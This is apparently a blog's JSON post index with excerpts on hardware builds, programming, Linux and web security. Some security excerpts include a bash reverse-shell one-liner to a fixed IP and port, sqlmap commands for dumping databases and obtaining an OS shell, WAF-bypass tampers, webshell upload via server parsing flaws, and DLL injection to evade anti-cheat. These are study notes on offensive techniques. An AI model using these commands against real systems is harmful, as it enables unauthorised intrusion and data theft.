Kioxia RC10 250G 345 cpu散热 Noctua NH-D9L, with second optional NF-A9 490 机箱散热 Noctua NF-A6x25 x2; Arctic P12 x2 115x2; 59x2 机箱 (WARHEAD)风冷快乐盒M 1000(闲鱼价，原价606) 额外配件 模组电源线; ADT R33SL显卡延长线 见上; 118 总计 - 6480（6083） 话说这机箱在CaseEnd上都找不到 也有考虑过10400+b460i的组合，温度和供电应该会好一些，但一来是要贵个300百多，二来10400焊钎和硅脂混用摸奖，所以最后还是选了3500x+b450i 现在想来，感觉SSD买小了… 3. 组装3.1. 开放平台点亮测试","categories":[{"name":"随笔","slug":"essay","permalink":"https://hejueyun.github.io/categories/essay/"},{"name":"杂玩","slug":"essay/toys","permalink":"https://hejueyun.github.io/categories/essay/toys/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"数据结构备忘录","date":"2020-09-28T19:38:15.000Z","path":"posts/361891ac/","slug":"数据结构备忘录","permalink":"https://hejueyun.github.io/posts/361891ac/","excerpt":"1. 链表 链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。 链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。 每个结点包括两个部分： 一个是存储数据元素的数据域 另一个是存储下一个结点地址的指针域 2. 查找线性查找略","categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://hejueyun.github.io/categories/Algorithm/"},{"name":"Data Structure","slug":"Algorithm/Data-Structure","permalink":"https://hejueyun.github.io/categories/Algorithm/Data-Structure/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"常见漏洞利用","date":"2020-09-28T13:49:32.000Z","path":"posts/336e90f4/","slug":"常见漏洞利用","permalink":"https://hejueyun.github.io/posts/336e90f4/","excerpt":"1. OWASP TOP 10 漏洞定义 攻击原理 利用场景 修复方案 XSS 在动态生成的web页面直接显示不可信（未严格验证）的外部输入，恶意用户可以利用该缺陷往动态页面中注入恶意script代码再浏览器页面执行 存储：留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来 反射：插入url DOM：浏览器 cookie 网站挂马 钓鱼 xsrf http-only 输入过滤 输出编码处理 全局XSS过滤器 SQL注入 SQL代码注入或者添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行 其本质是对于输入的检查不充分，简言而之就是用户提交的数据代入数据库的查询。 数据泄露 绕过认证、验证、绕过登录 严格限定参数类型； 参数化查询强制开发者先定义所有的SQL语句，然后向每个查询传递参数。使用参数化查询可以使数据库区分代码和数据的区别，用户输入会被当做数据处理，而不是当成代码被执行。 内置过滤系统（本质是黑名单，很常见但不推荐）经常采用addslashes函数，他会在指定的预定义字符前添加反斜杠转义，预定义字符；单引号（‘）双引号（“）反斜杠0 NULL； CSRF攻击 以受害者的名义伪造请求发送给受攻击的站点，从而在并未授权的情况下执行在权限保护之下的操作 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 添加管理员账号提权 购买商品，虚拟货币转账等 验证HTTP Referer字段 在请求头中添加token并验证;在服务器端建立一个拦截器来验证这个token。 在HTTP头中自定义属性并验证；和第2中方式一样使用token验证，区别在于并不是以请求参数的形式添加到HTTP请求中，而是放置在http头中自定义的属性里 权限绕过&#x2F;未授权访问 超出了权限或权利范围访问系统 未授权、水平、垂直 比如说某一页面服务器端响应（不局限于页面返回的信息，有时信息在响应包中，页面不一定能看见）中返回登录名、密码、手机号、身份证等敏感信息，如果存在平行越权，通过对用户ID遍历，就可以查看所有用户的敏感信息，这也是一种变相的脱裤，而且很难被防火墙发现，因为这和正常的访问请求没有什么区别，也不会包含特殊的字符，具有十足的隐蔽性 对于可控参数进行严格的校验与过滤。 不要直接使用对象的实名或关键字 完善用户权限体系 任意文件上传 若服务端脚本语言未对上传的文件进行严格的验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务器命令的能力 本地文件上传限制被绕过 中间件解析漏洞 相册、头像上传 文件扩展名服务器端白名单校验 判断文件类型（可结合MIME Type,后缀检查等方式） 上传文件重命名 隐藏上传文件路径 文件上传目录设置为不可执行 XXE XML外部实体注入。当允许引用外部实体时，通过构造恶意的内容，就可以导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害 通常攻击者会将payload注入到XML文件中，一旦文件被执行，将会被读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务器的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则或者身份认证检查。 远程代码执行，读取服务器文件 配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己生命的DTD 会话固定攻击 会话固定（Session fixation)是一种诱骗受害者使用攻击者指定的会话标识（Session fixation)的攻击手段 攻击者通过某种手段重置目标用户的SessionID,然后监听用户会话状态 每当用户登录的时候就会重置SessionID SessionID闲置过久时，进行重置SessionID 大部分防止会话劫持的方法对会话固定攻击同样有效。如设置httpOnly，关闭透明化SessionID，User-Agent验证，Token校验等 敏感信息泄露 敏感信息通过明文保存，界面未掩码，后端接口返回，直接放在URL中等方式造成数据泄露，称之为敏感信息泄露 数据被盗取贩卖 使用HTTPS传输敏感信息； 敏感信息使用POST请求提交 命令行注入攻击 参数接收用户输入，并未过滤用户输入的数据，攻击者可以构造恶意命令或代码形成系统命令执行漏洞 系统提权;读取&#x2F;操作系统敏感文件 用白名单方式，对一切用户输入进行校验过滤 反序列化 通常在解析认证token，session的时候。现在很多web都使用redis、mongodb、memcached等来存储session等状态信息 可能将对象Pickle后在网络中传输 2. DLL注入 现代软件其实都不是一个打包的一整个exe，而是一个个互相分工的模块。这样做的好处(多得要死，分工写代码&#x2F;方便维护&#x2F;blablabla…. exe就是软件的启动模块。在你打开exe之后，Windows会根据exe的要求，把exe需要的其他模块(也就是dll)，也一起加载进来。以这个exe为启动点关联起来的(exe和dll们)这么一堆代码，就被称为一个进程 dll注入技术听名字就知道，就是和打针一样，把exe不需要的dll强行加载进进程里去 现在的反外挂系统，都会监视Windows的这些个接口，发现这些接口被谁调用了！就知道外挂进来了。所以现在的游戏dll注入，一般都用更难被检测出来的输入法注入 而不是Windows提供的接口(道高一尺魔高一丈((逃 Windows的一个特性，你在一个进程切换输入法，Windows就会把输入法的dll(输入法dll有个别名，叫ime，但其实和dll大同小异)注入到当前进程里去。因为这个是输入法dll，还是操作系统官方名正言顺的注入，所以反外挂系统也很难判断 3. 参考与摘抄 Owasp Top10 Web安全宝典-常见漏洞及修复方案_D.K专栏-CSDN博客 游戏中注入 DLL 是什么意思，具体怎么实现的？ - LoyieKing的回答 - 知乎","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"}],"tags":[]},{"title":"日志审计与痕迹清除","date":"2020-09-28T08:39:16.000Z","path":"posts/8ee79e5a/","slug":"日志审计与痕迹清除","permalink":"https://hejueyun.github.io/posts/8ee79e5a/","excerpt":"","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Network Security","slug":"Security/Network-Security","permalink":"https://hejueyun.github.io/categories/Security/Network-Security/"}],"tags":[]},{"title":"渗透测试与主机加固","date":"2020-09-25T13:23:59.000Z","path":"posts/cc1ceb62/","slug":"渗透测试与主机加固","permalink":"https://hejueyun.github.io/posts/cc1ceb62/","excerpt":"1. 前言 想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 Exp，你在他家所做的就是不同的 Payload，就把窃听器当作 Shellcode 吧！ 渗透中 PoC、Exp、Payload 与 Shellcode 的区别 2. 渗透测试框架2.1. Metasploit2.2. Empire2.3. Cobalt Strike","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"}],"tags":[]},{"title":"python socket编程笔记","date":"2020-09-23T16:39:44.000Z","path":"posts/3cdb8d49/","slug":"python-socket编程笔记","permalink":"https://hejueyun.github.io/posts/3cdb8d49/","excerpt":"1. UDP1.1. 创建套接字1234567891011121314151617udp_socket=socket.socket(AddressFamily,Type)# 1. 创建套接字 # AddressFamily:AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6# Type：套接字类型，可以是 SOCK_STREAM（流式套接字，主要用于 TCP 协议）或者 SOCK_DGRAM（数据报套接字，主要用于 UDP 协议） udp_socket.sendto(&quot;我是发送的消息&quot;.encode(&quot;utf-8&quot;),(&quot;10.200.202.119&quot;,8888))# 2. 指定服务器ip和端口，并发送消息 receive_data, from_addr = udp_socket.recvfrom(buffersize) # 3. 接受消息# buffersize:指定一次接受的字节大小# return:返回为一个元祖，第一个参数表示接受的数据，第二个参数表示消息来源地址udp_socket.close()# 4. 关闭套接字 1.2. UDP多线程聊天室12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import socketimport threadingis_exit_send_msg = Falsedef send_msg(udp_socket, dest_addr): global is_exit_send_msg while True: send_data = input(&quot;请输入要发送的内容：\\n&quot;) if send_data == &quot;exit&quot;: is_exit_send_msg = True print(&quot;退出发送消息&quot;) break udp_socket.sendto(send_data.encode(&quot;GBK&quot;), dest_addr)def receive_msg(udp_socket): global is_exit_send_msg while True: receive_data, from_addr = udp_socket.recvfrom(1024) if receive_data.decode(&quot;GBK&quot;) == &quot;exit&quot;: print(&quot;退出接收消息&quot;) break print(str(from_addr)+&quot; 发来消息：\\n&quot;+receive_data.decode(&quot;GBK&quot;)) if not is_exit_send_msg: print(&quot;请输入要发送的内容:&quot;)def main(): # 1.创建udp socket udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # 2.输入要连接的ip和端口 dest_ip = input(&quot;输入要连接的ip:\\n&quot;) dest_port = int(input(&quot;输入端口号：\\n&quot;)) dest_addr = (dest_ip, dest_port) # 3.创建发送消息线程 thread_send = threading.Thread(target=send_msg, args=(udp_socket, dest_addr)) # 4.创建接收消息线程 thread_receive = threading.Thread(target=receive_msg, args=(udp_socket,)) # 5.开启发送消息线程 thread_send.start() # 6.开启接收消息线程 thread_receive.start()if __name__ == &quot;__main__&quot;: main() 2. TCP2.1. TCP客户端123456789101112#创建套接字tcp_socket = socket.socket(AF_INET, socket.SOCK_STREAM)#连接服务器，需指定服务器ip和端口tcp_socket.connet((ip,port))#发送数据/接受数据tcp_socket.send(&quot;我是发送的消息&quot;.encode(&quot;utf-8&quot;))receive_data = tcp_socket.recv(1024)#关闭套接字tcp_socket.close() 2.2. TCP服务端12345678910111213141516# 创建套接字tcp_server_socket = socket.socket(AF_INET,socket.SOCK_STREAM)# 绑定服务端ip和端口 tcp_server_socket.bind((ip,port)) # 开启监听，监听客户端连接tcp_server_socket.listen(max) # max:表示同时客户端最大的连接数# accept:接受一个客户端连接并返回一个处理这个连接的socketnew_client_socket,client_addr = tcp_server_socket.accept() # new_client_socket:处理这个连接的socket# client_addr:连接客户端的地址（ip和端口号）# 接受/发送消息receive_data=new_client_socket.recv(1024)new_client_socket.send(&quot;我是发送的消息&quot;.encode(&quot;utf-8&quot;))","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Advanced","slug":"Program-Language/Python/Advanced","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Advanced/"}],"tags":[]},{"title":"python小知识-2","date":"2020-09-23T15:27:59.000Z","path":"posts/ccd71406/","slug":"python小知识-2","permalink":"https://hejueyun.github.io/posts/ccd71406/","excerpt":"1. python中str函数isdigit、isdecimal、isnumeric的区别1234num = &quot;四&quot; # 汉字num.isdigit() # Falsenum.isdecimal() # Falsenum.isnumeric() # True 2. 判断奇偶数1if i &amp; 1 == 1 3. python矩阵旋转12def rotate(self, matrix): matrix[:] = map(list,zip(*matrix[::-1])) matrix[::-1]: 上下翻转 4. 安全随机数123import secretssecret_generator=secrets.SystemRandom()secret_generator.randint(1,100) 5. 全局变量与局部变量","categories":[],"tags":[]},{"title":"应急响应笔记","date":"2020-09-21T08:49:36.000Z","path":"posts/c97b424c/","slug":"应急响应笔记","permalink":"https://hejueyun.github.io/posts/c97b424c/","excerpt":"1. 常用命令","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"安全工具笔记","date":"2020-09-14T19:41:21.000Z","path":"posts/58ca39f2/","slug":"安全工具笔记","permalink":"https://hejueyun.github.io/posts/58ca39f2/","excerpt":"1. sqlmap1.1. 数据库注入123456789101112131415161718192021222324252627282930313233# 谷歌注入# 相当于加上https://www.google.com.hk/search?q=inurl:php?id=# Cookie注入，猜解表sqlmap -u url --cookie &quot;id=31&quot; --table --level 2# 获取一个Shellsqlmap -u url --sql-shell# sqlmap -u url --os-cmd=ipconfigsqlmap -u url --os-shell # 选择语言# mysql注入(前提是mysql)sqlmap -u url --dbs # 找库sqlmap -u url -D dbname --table # 找表sqlmap -u url -D dataname -T table_name --columns # 找列sqlmap -u url -D dataname -T table_name -c &quot;id,user,password&quot; --dump # 获取字段的值(假如扫描出id,user,password字段)# post登陆框注入# 配置burp代理(127.0.0.1:8080)以拦截请求# 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下sqlmap -r search-test.txt -p tfUPass # 请求延迟--delay 1 --safe-freq# 绕过WAF防火墙--batch --tamper &quot;space2morehash.py&quot;# 使用注释符#(%23) 再就是使用随机的字符串和一个换行符(%0A)来替换空格# 浏览器--random-agent 参数 u url p parameter eg. ?id= batch bat 批处理 level 123payload,5级包含的payload最多。http cookie在2级时可以检测HTTP user-Agent/Referer在3级时就会检测 注意url里要包括参数，不然报错 no parameter(s) found for testing in the provided data 在实际中我们发现，这样得到的IP地址有很多是没有响应的，如果对所有的地址进行扫描，会非常费时费力，我们要进行二次过滤，使用Python批量对地址进行请求， 过滤掉不响应或响应过慢的网页 requests.get(ip,timeout=6)","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"linux文件系统笔记","date":"2020-09-11T22:17:52.000Z","path":"posts/2617683d/","slug":"linux文件系统笔记","permalink":"https://hejueyun.github.io/posts/2617683d/","excerpt":"例如，read 函数调用可以从指定的文件描述符读取一定数量的字节。read 函数不了解文件系统的类型，比如 ext3 或 NFS。它也不了解文件系统所在的存储媒体，比如 AT Attachment Packet Interface（ATAPI）磁盘、Serial-Attached SCSI（SAS）磁盘或 Serial Advanced Technology Attachment（SATA）磁盘。但是，当通过调用 read 函数读取一个文件时，数据会正常返回 1. 基本概念1.1. 文件系统 一个存储设备上的数据和元数据进行组织的机制 元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（data about data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能 1.2. 挂装 在 Linux 中将一个文件系统与一个存储设备关联起来的过程称为挂装（mount）。使用 mount 命令将一个文件系统附着到当前文件系统层次结构中（根） 1.3. 用户态（用户空间）与内核态 VFS 是底层文件系统的主要接口。这个组件导出一组接口，然后将它们抽象到各个文件系统，各个文件系统的行为可能差异很大。有两个针对文件系统对象的缓存（inode 和 dentry） 每个文件系统实现（比如 ext2、JFS 等等）导出一组通用接口，供 VFS 使用 1.4. 虚拟文件系统层","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Notes","slug":"Operating-System/Linux/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Notes/"}],"tags":[]},{"title":"系统小知识-1","date":"2020-09-09T14:40:27.000Z","path":"posts/edc30384/","slug":"系统小知识-1","permalink":"https://hejueyun.github.io/posts/edc30384/","excerpt":"1. pool跟cluster有什么区别? pool即池，若干个资源的集合，注意，仅仅只是集合，没有任何功能，正常情况下，池中可能有很多资源，这些资源可以没有任何关联性，也可以没有任何功能性的相似，比如，把阿猫阿狗阿鸡阿鸭放在一只笼子里，可以认为他们就组成了一个资源池，然后呢，没有然后，这就是pool。 cluster即集群，若干个资源的集合，赋予一些调度功能，一般情况下，集群中必定有很多存在的资源，这些资源彼此独立，但可以同时完成同一件事情，比如，两台服务器组成的服务集群，访问a或者b都能获得一样的结果，a挂了被t出去b接着接活，这就像把三只阿猫放在一个笼子里，组成一个集群，随便捞一只撸一撸，发出的都是猫叫声。 pool跟cluster有什么区别? - 进击的蜘蛛的回答 - 知乎","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Notes","slug":"Operating-System/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Notes/"}],"tags":[]},{"title":"redis速成","date":"2020-09-09T13:10:27.000Z","path":"posts/2218125b/","slug":"redis速成","permalink":"https://hejueyun.github.io/posts/2218125b/","excerpt":"1. 定义 Redis是一个开源的、基于内存的数据结构存储器，可以用作数据库、缓存和消息中间件 Redis不仅仅是数据存储器，而是数据结构存储器。那是因为Redis支持客户端直接往里面塞各种类型的数据结构，比如String、List、Set、SortedSet、Map等等","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"redis","slug":"Sql/redis","permalink":"https://hejueyun.github.io/categories/Sql/redis/"}],"tags":[]},{"title":"linux小知识-2","date":"2020-09-08T22:04:18.000Z","path":"posts/3c9aad00/","slug":"linux小知识-2","permalink":"https://hejueyun.github.io/posts/3c9aad00/","excerpt":"1. linux磁盘管理1.1. 常用命令 df：列出文件系统的整体磁盘使用量 du：检查磁盘空间使用量 fdisk：用于磁盘分区 12345678910111213141516171819202122232425262728# 1 sudo df -lFilesystem 1K-blocks Used Available Use% Mounted on/dev/sdb 263174212 11004068 238731988 5% /tmpfs 6490812 0 6490812 0% /mnt/wsltools 248951756 149693896 99257860 61% /initnone 6488404 0 6488404 0% /devnone 6490812 12 6490800 1% /runnone 6490812 0 6490812 0% /run/locknone 6490812 0 6490812 0% /run/shmnone 6490812 0 6490812 0% /run/usertmpfs 6490812 0 6490812 0% /sys/fs/cgroup# 2sudo du | more# 只列出当前目录下的所有文件夹容量（包括隐藏文件夹）4 ./.AndroidStudio3.5/config/codestyles36 ./.AndroidStudio3.5/config/options5080 ./.AndroidStudio3.5/config/plugins0 ./.AndroidStudio3.5/config/tasks5120 ./.AndroidStudio3.5/config# 3sudo fdisk -l | moreDisk /dev/ram0: 64 MiB, 67108864 bytes, 131072 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 4096 bytesI/O size (minimum/optimal): 4096 bytes / 4096 bytes 1.2. Linux中&#x2F;dev&#x2F;ram是什么？ 什么是RamDisk？RamDisk就是将内存（Ram）的一部分当做硬盘（Disk）来使用。RamDisk有固定的大小，可以像正常硬盘分区那样去使用。 就操作时间来讲，RamDisk比真实的物理硬盘快很多，当系统关闭或断电时，保存在RamDisk中的数据会全部丢失。RamDisk可以成为一个存放临时数据的好地方。","categories":[],"tags":[]},{"title":"信安小知识-8","date":"2020-09-07T22:37:16.000Z","path":"posts/e8a9484d/","slug":"信安小知识-8","permalink":"https://hejueyun.github.io/posts/e8a9484d/","excerpt":"1. 如何防止多线程死锁 允许资源共享 2. 过滤单引号sql注入 攻击方账号输入 1\\ 密码输入or 1&#x3D;1 –+ ，最后拼接出来的语句是select from xxx where id&#x3D;’1&#39; and pw&#x3D;’or 1&#x3D;1–+’ 其中\\将’转义，id的值就变为（1’ and pw&#x3D;），后边跟一个or 1&#x3D;1返回的逻辑为true就可以进行SQL注入了，所以最好还是采用预编译的方式进行SQL注入 作者：dale链接：https://www.zhihu.com/question/24967863/answer/947264282来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 3. sql注入注释–+ 或者#（%23）&#x2F;**&#x2F; url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括# ＋号在语句中变成了空格。用来和后面的单引号分隔开，将后面的语句注释。 了解原理后便知道了--无法使用的原因，是因为--与后面的这个单引号连接在一起，无法形成有效的mysql语句 注释问题探索_老夏家的云 4. bash反弹shell bash -i &gt;&amp; /dev/tcp/192.168.25.144/8888 0&gt;&amp;1 5. Redis未授权访问漏洞","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"网络小知识-2","date":"2020-09-05T14:36:09.000Z","path":"posts/cc1c35ed/","slug":"网络小知识-2","permalink":"https://hejueyun.github.io/posts/cc1c35ed/","excerpt":"1. 通信协议相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则 语法：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义 语义：用于解释比特流的每一部分的意义 时序：事件实现顺序的详细说明 2. OSI七层模型开放式系统互联(Open System Interconnection) 2.1. 物理层从数据链路层接收帧，将比特流转换成底层物理介质上的信号 2.2. 数据链路层 提供数据的流量控制 数据链路层的可靠传输通常使用确认和超时重传两种机制来完成 。 确认是一种无数据的控制帧，这种控制帧使得接收方可以让发送方知道哪些内容被正确接收。有些情况下为了提高传输效率，将确认捎带在一个回复帧中，称为捎带确认 。 超时重传是指发送方在发送某一个数据帧以后就开启一个计时器 ，在一定时间内如果没有得到发送的数据帧的确认帧 ，那么就重新发送该数据帧，直到发送成功为止 。 检测和纠正物理链路产生的差错","categories":[{"name":"Computer Network","slug":"Computer-Network","permalink":"https://hejueyun.github.io/categories/Computer-Network/"},{"name":"Notes","slug":"Computer-Network/Notes","permalink":"https://hejueyun.github.io/categories/Computer-Network/Notes/"}],"tags":[]},{"title":"php速成","date":"2020-09-02T13:35:13.000Z","path":"posts/32789a61/","slug":"php速成","permalink":"https://hejueyun.github.io/posts/32789a61/","excerpt":"1. 文件 PHP 是 “PHP Hypertext Preprocessor” 的首字母缩略词 PHP 文件能够包含文本、HTML、CSS 以及 PHP 代码 PHP 代码在服务器上执行，而结果以纯文本返回浏览器 PHP 文件的后缀是 “.php” 可以写在html里 1.1. 功能 PHP 能够生成动态页面内容 PHP 能够创建、打开、读取、写入、删除以及关闭服务器上的文件 PHP 能够接收表单数据 PHP 能够发送并取回 cookies PHP 能够添加、删除、修改数据库中的数据 PHP 能够限制用户访问网站中的某些页面 PHP 能够对数据进行加密 2. 语法1234&lt;?php// PHP 语句以分号结尾（;）echo ?&gt; &lt;?php开头 ?&gt;结尾 2.1. 注释123456789&lt;?php// 1/* 2 */# 3?&gt; 大小写不敏感","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"php","slug":"Program-Language/php","permalink":"https://hejueyun.github.io/categories/Program-Language/php/"},{"name":"Basic","slug":"Program-Language/php/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/php/Basic/"}],"tags":[]},{"title":"信安小知识-7","date":"2020-08-26T20:17:28.000Z","path":"posts/781655dc/","slug":"信安小知识-7","permalink":"https://hejueyun.github.io/posts/781655dc/","excerpt":"1. 谈谈在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？ 通过大量的分析，我们发现攻击者在对网站入侵时，向网站发起的请求中会带有特定的攻击特征，如利用WEB扫描器在对网站进行漏洞扫描时往往会产生大量的404错误日志，当有攻击者对网站进行SQL注入漏洞探测时，WEB访问日志中通常会出现and 1&#x3D;1等字样） 2. Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？12345678910Apache解析漏洞。它 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.比如upupimage.php.owf.rar “.owf”和”.rar”?这两种后缀是apache不可识别解析,apache就会把upupimage.php.owf.rar解析成php.IIS 解析漏洞。一是IIS5.x/6.0中的/xx.asp/xx.jpg ，网站下建立文件夹的名字为.asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。二 是123.asp;.jpg会被服务器看成是123.asp，IIS6.0 默认的可执行文件除了asp还包含这三种/upupimage.asa/upupimage.cer /upupimage.cdx nginx解析漏洞。一是nginx默认Fast-CGI开启状况下,黑阔上传一个名字为upupimage.jpg，内容为&lt;?PHP ?&gt;&#x27;);?&gt;的文件，然后访问upupimage.jpg/.php,在这个目录下就会生成一句话木马 shell.php。二是Nginx在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码，影响版:0.5.,0.6.,0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37 3. 从哪些方面可以进行CSRF漏洞防御？12345CSRF漏洞防御主要可以从三个层面进行，即服务端的防御、用户端的防御和安全设备的防御。1.检测HTTPreferer 字段同域。根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问http://bank.test/test?page=10&amp;userID=101&amp;money=10000页面完成，用户必须先登录bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank. test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求2.限制sessioncookie的生命周期。CSRF攻击是有条件的，当用户访问恶意链接时，认证的cookie仍然有效，所以当用户关闭页面时要及时清除认证cookie3.使用验证码。虽然攻击者已经通过获取cookie得到用户的身份，但是通过在你的表单中包括验证码，事实上网站已经消除了跨站请求伪造攻击的风险。可以在任何需要执行操作的任何表单中使用这个流程。4.cookie关键字段设置HttpOnly属性。可以在一定程度防御CSRF。","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"[外设]Fokrere 64键盘组装记录","date":"2020-08-21T13:28:11.000Z","path":"posts/905f2d16/","slug":"外设-Fokrere-64键盘组装记录","permalink":"https://hejueyun.github.io/posts/905f2d16/","excerpt":"1. 引言自从对机械键盘知识恶补一番之后，日日念想着便是再纳新欢，更是对起老情人处处挑剔——在和手中YMDK出品的客制化AMJ 40键盘相处数月后，其松胯的大键与算不上悦耳的Cherry红愈发地令我抓狂。在多番挑选后，最终敲定了华艺外设的Fokrere 64。（PS：Fokrere64原出自葫芦客制化Fokrere） 2. 正文 阳极月球灰电泳外壳 灰色百搭，却也有点浪费电泳带来的“纯色”特性；Type-C插口宽且深，使之能对各种线材提供兼容的同时，也意味着盲插会相当痛苦。 山木64PCB + 耳朵Equal卫星轴V2 PCB则摸着有种陶瓷的手感（也许就是，或者是涂层）；而锣丝卫星轴到手就已用泰阳润滑脂以及缓冲贴调教好，可谓是动手能力低下的人的福音。 耳朵Equal PCB卫星轴 全pom材质，内部镜面效果；摩擦力更小 优化钢丝槽，包裹性更强，不易掉钢丝 组装后补充：这种小众PCB的驱动软件是真的难用，不仅键位设置时常有BUG，而且诸如SLEEP功能键也不提供，总之远不如qmk靠谱 轴体：TTC静音茶V2 Pro 碳纤维定位板 + 吸音棉 静音茶有一个好，敲起来比谁都安静🐶。其与静电容大体相似，沉闷而沙哑；经过测试基本无弹簧音，轴心稳定性佳，并做到声音的一致性，与Cherry红形成鲜明对比，同时较Cherry茶而言，段落触发更为顺滑。 组装后补充：我这批静音茶中有一个轴臭掉了，会有类似box白的click声响….姑且把它放到CAPS键上当作提示音吧… 键帽： DOMIKEY 黑色同刻 我曾不假思索地相信：PBT是优ABS的存在，直到用了ikbc c87如同腻子粉的PBT键帽…… 有过OEM和xda高度的经历，对于这次的SA球帽，除开本身高度与外弧度外，最大的感受就是：晃。即在快速敲击时，会有些许不稳、抖动的感（错）觉。 相信大家都学过初中物理，力矩越大，轴心受力就越大，也就更容易晃动。加上线性轴本身就直上直下，所以会非常晃。由此可得 SA 键帽更适合一段式段落轴，并且最好段落感提前。这样可以抵消手指放上去下压的力度，这样只有左右晃动。所以建议高键帽搭配亚力克数高的段落轴体 作者：Mellperbia 从外观上看黑色同刻看着不错，从外壳灰色的色阶过渡更自然，只是感觉要是字符和外壳同色会更好看（无刻乃异端🐶）。当然，ABS顺滑是真，打油也是真的；只是没有想像中那么丝滑，却比想像中更容易留油迹…… LShift一处划痕😥 